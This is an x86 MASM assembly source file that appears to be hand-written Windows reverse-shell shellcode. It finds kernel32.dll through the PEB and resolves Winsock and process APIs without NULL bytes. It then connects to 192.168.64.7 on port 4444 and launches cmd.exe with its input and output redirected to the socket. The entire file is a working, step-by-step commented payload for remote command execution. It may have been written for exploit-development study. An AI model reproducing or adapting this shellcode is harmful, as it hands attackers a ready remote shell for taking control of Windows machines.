.386
Option CaseMap:None

.Code
start:

	Assume Fs:Nothing
	Sub Esp, 0B8H
	Xor Eax, Eax
	Mov [Ebp - 4H], Eax			; This will store the number of exported function in kernel32.dll
	Mov [Ebp - 8H], Eax			; This will store the address of exported table
	Mov [Ebp - 0CH], Eax			; This will store the address of exported name table
	Mov [Ebp - 10H], Eax			; This will store the address of ordinal table
	Mov [Ebp - 14H], Eax			; This will store the address of GetProcAddress
	Mov [Ebp - 18H], Eax			; This will store the address of LoadLibraryA
	Mov [Ebp - 1CH], Eax			; This will store WaitForSingleObject base address
	Mov [Ebp - 20H], Eax			; This will store ws2_32.dll base address
	Mov [Ebp - 24H], Eax			; This will store WSStartup base address
	Mov [Ebp - 28H], Eax			; This will store WSASocketA base address
	Mov [Ebp - 4AH], Eax			; This will store connect() base address
	Mov [Ebp - 4EH], Eax			; This will store the address of CreateProcessA

	Mov Ax, 7373H
	Push Eax				; Avoid NULL bytes
	Push 65726464H
	Push 41636F72H
	Push 50746547H
	Mov [Ebp - 14H], Esp			; Push GetProcAddress

	Mov Eax, [Fs:30H]			; PEB
	Mov Eax, [Eax + 0CH]			; PEB_LDR_DATA
	Mov Eax, [Eax + 14H]			; InMemoryOrderModuleList
	Mov Eax, [Eax]				; Get pointer to the second (ntdll.dll) entry in InMemoryOrderModuleList
	Mov Eax, [Eax]				; Get pointer to the third (kernel32.dll) list in InMemoryOrderModuleList
	Mov Eax, [Eax + 10H]
	Mov Ebx, Eax				; Store kernel32.dll base address in ebx

	Mov Eax, [Ebx + 3CH]
	Add Eax, Ebx				; PE signature

	Mov Eax, [Eax + 78H]
	Add Eax, Ebx				; Address of Export Table

	; Get number of exported functions
	Mov Ecx, [Eax + 14H]
	Add Ecx, Ebx
	Mov [Ebp - 4H], Ecx

	; Get address of functions
	Mov Ecx, [Eax + 1CH]
	Add Ecx, Ebx
	Mov [Ebp - 8H], Ecx

	; Get address of name table
	Mov Ecx, [Eax + 20H]
	Add Ecx, Ebx
	Mov [Ebp - 0CH], Ecx

	; Get address of ordinal table
	Mov Ecx, [Eax + 24H]
	Add Ecx, Ebx
	Mov [Ebp - 10H], Ecx

	Xor Eax, Eax				; Counter for loop
	Xor Ecx, Ecx

getFunctionPosition:
	Mov Esi, [Ebp - 14H]	; Name of Function
	Mov Edi, [Ebp - 0CH]	; Pointer points to the start of name table
	Mov Edi, [Edi + Eax * 4]; RVA of next function name
	Add Edi, Ebx

	Mov Cx, 8
	Repe Cmpsb				; Compare edi, esi
	Jz getGetProcAddress			; If found the name then jump to getGetProcAddress
	Inc Eax
	Cmp Eax, [Ebp - 4H]			; Check for if counter < number of functions
	Jne getFunctionPosition ; Loop

; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
getGetProcAddress:
	Xor Ecx, Ecx
	Mov Ecx, [Ebp - 10H]			; Address of ordinal table
	Mov Edx, [Ebp - 8H]			; Address of function

	Mov Ax, [Ecx + Eax * 2]			; Get the function ordinal
	Mov Eax, [Edx + Eax * 4]
	Add Eax, Ebx				; Function address
	Jmp getFunctionAddress

; Using GetProcAddress to get the address of LoadLibraryA
; This part is used to find necessary libraries and functions
getFunctionAddress:
	Xor Ecx, Ecx
	Xor Edx, Edx
	Mov Edx, Eax
	Mov [Ebp - 14H], Edx			; Saving base address of GetProcAddress
	Push Ecx
	Push 41797261H				; aryA
	Push 7262694CH				; Libr
	Push 64616F4CH				; Load
	Push Esp
	Push Ebx				; Kernel32 base address
	Call Edx				; Call GetProcAddress
	Mov [Ebp - 18H], Eax			; Saving LoadLibraryA address

	; Load CreateProcessA
	Add Esp, 0CH
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Cx, 4173H
	Push Ecx
	Push 7365636FH
	Push 72506574H
	Push 61657243H
	Push Esp
	Push Ebx
	Call Edx
	Mov [Ebp - 4EH], Eax			; Saving CreateProcessA()

	; Load WaitForSingleObject
	Add Esp, 0CH
	Mov Edx, [Ebp - 14H]
	Push 61746365H
	Sub DWord Ptr [Esp + 3H], 61H
	Push 6A624F65H
	Push 6C676E69H
	Push 53726F46H
	Push 74696157H
	Push Esp				; WaitForSingleObject
	Push Ebx
	Call Edx
	Mov [Ebp - 1CH], Eax			; Saving WaitForSingleObject()

	; The returned data is saved to eax register
	; Load ws2_32.dll using LoadLibraryA
	Mov Eax, [Ebp - 18H]
	Add Esp, 14H				; Clear WaitForSingleObject from the stack
	Xor Ecx, Ecx
	Mov Cx, 6C6CH				; ll
	Push Ecx
	Push 642E3233H				; 32.d
	Push 5F327377H				; ws2_
	Push Esp				; ws2_32.dll
	Call Eax				; Call LoadLibraryA
	Mov [Ebp - 20H], Eax			; Saving ws2_32 base address

	; Get WSAStartup address
	Add Esp, 0CH				; Clear ws2_32.dll from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Cx, 7075H
	Push Ecx
	Push 74726174H
	Push 53415357H
	Push Esp 				; WSAStartup
	Push Eax				; ws2_32.dll base address
	Call Edx				; GetProcAddress
	Mov [Ebp - 24H], Eax			; Saving WSAStartup address

	; Get WSASocketA address
	Add Esp, 0CH				; Clear WSAStartup from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]			; Base address of GetProcAddress
	Mov Eax, [Ebp - 20H]			; ws2_32 base address
	Mov Cx, 4174H
	Push Ecx
	Push 656B636FH
	Push 53415357H
	Push Esp
	Push Eax
	Call Edx				; GetProcAddress
	Mov [Ebp - 28H], Eax			; Saving WSASocketA base address

	; Get connect() base address
	Add Esp, 0CH				; Clear WSASocketA from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Eax, [Ebp - 20H]
	Mov Ecx, 61746365H
	Push Ecx
	Sub DWord Ptr [Esp + 3H], 61H
	Push 6E6E6F63H
	Push Esp 				; connect
	Push Eax				; ws2_32.dll base address
	Call Edx				; GetProcAddress
	Mov [Ebp - 4AH], Eax			; Saving connect() base address

shell:
	; System call: WSAStartup
	Xor Edx, Edx
	Xor Ecx, Ecx
	Mov Dx, 190H
	Sub Esp, Edx				; Creating space for WSAData
	Push Esp				; lpWSAData
	Mov Cx, 202H
	Push Ecx
	Mov Eax, [Ebp - 24H]
	Call Eax

	; System call: WSASocketA
	Xor Eax, Eax
	Push Eax				; dwFlags = NULL
	Push Eax				; g = NULL
	Push Eax				; lpProtocolInfo = NULL
	Xor Edx, Edx
	Mov Dl, 6H
	Push Edx				; protocol = 6 = IPPROTO_TCP
	Inc Eax
	Push Eax				; type = 1
	Inc Eax
	Push Eax				; af = 2
	Mov Eax, [Ebp - 28H]
	Call Eax
	Mov Ebx, Eax				; WSASocketA() Handler

	; Sytem call: connect
	; connect(SOCKET s, const addr *name, int namelen)
	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
	; listen on all interfaces
	Mov Eax, 0740A8C0H 			; 192.168.64.7
	Push Eax
	Mov Eax, 5C110102H
	Dec Ah					; 5C110102 => 5C110002 (Remove 01)
	Push Eax
	Mov Esi, Esp
	Xor Eax, Eax
	Mov Ax, 10H
	Push Eax				; namelen = 16 bytes
	Push Esi				; *name: 5C110002
	Push Ebx				; Arg 1(s): WSASocketA() Handler
	Mov Eax, [Ebp - 4AH]			; connect()
	Call Eax

	; CreateProcessA
	Push 61646D63H						; "acmd"
	Sub DWord Ptr [Esp + 3H], 61H				; Remove "a"
	Mov Edx, Esp						; edx = pointer to "cmd" string

	; STARTUPINFO struct
	Push Ebx						; SetStdInput to WSASocketA() handler
	Push Ebx						; SetStdOutput to WSASocketA() handler
	Push Ebx						; SetStdError to WSASocketA() handler
	Xor Ebx, Ebx
	Xor Ecx, Ecx
	Add Cl, 12H						; ecx = 18

zero_mem_struct:
	Push Ebx						; 0
	Loop zero_mem_struct					; Throw 0x00000000 into the stack 18 times
	Mov Word Ptr [Esp + 3CH], 101H				; dwFlag (60 bytes from the top of the stack)
	Mov Byte Ptr [Esp + 10H], 44H
	Lea Eax, [Esp + 10H]

	; Calling CreateProcessA
	Push Esp						; Pointer to PROCESS_INFORMATION structure
	Push Eax						; Pointer to STARUPINFOA structure
	Push Ebx
	Push Ebx
	Push Ebx
	Inc Ebx
	Push Ebx						; bInheritAttributes = 1 (True)
	Dec Ebx					
	Push Ebx						; lpThreadAttributes = 0 (False)
	Push Ebx						; lpProcessAttributes
	Push Edx						; Pointer to cmdline
	Push Ebx						; lpApplicationName
	Mov Eax, [Ebp - 4EH]					; eax = CreateProcessA base address
	Call Eax						; Call CreateProcessA

	; Calling WaitForSingleObject
	Mov Edx, [Ebp - 1CH]					; Save WaitForSingleObject base address to edx
	Mov Eax, Esp						; eax = pointer to PROCESS_INFORMATON structure
	Push Ebx						; dwMiliseconds = 0
	Push Eax
	Call Edx						; Call WaitForSingleObject

End start
